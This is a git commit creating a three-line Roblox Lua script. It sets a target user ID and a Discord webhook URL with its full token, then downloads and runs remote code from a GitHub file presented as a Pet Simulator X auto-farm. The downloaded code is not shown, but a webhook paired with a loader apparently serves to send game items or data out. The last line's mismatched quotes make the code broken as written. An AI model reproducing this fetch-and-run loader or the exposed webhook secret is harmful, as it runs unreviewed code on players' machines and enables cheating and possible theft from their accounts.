4debc56d7be554725ab8e6f61ff057d46b4d45a7
Muhammad6l96 <121688575+Muhammad6I96@users.noreply.github.com>
2022-12-31 20:17:59 +0200

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,3 @@
+_G.UserID = 1319607527
+_G.WebHook = "https://discord.com/api/webhooks/1057322169660608643/GiM6FZPaHFY20v3E2E-Msw8xiJGTYlTew9c3fUwOtlNf2J4lvRbBL5zq1fHpgtZMvybJfHpgtZMvybJ"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua"))()
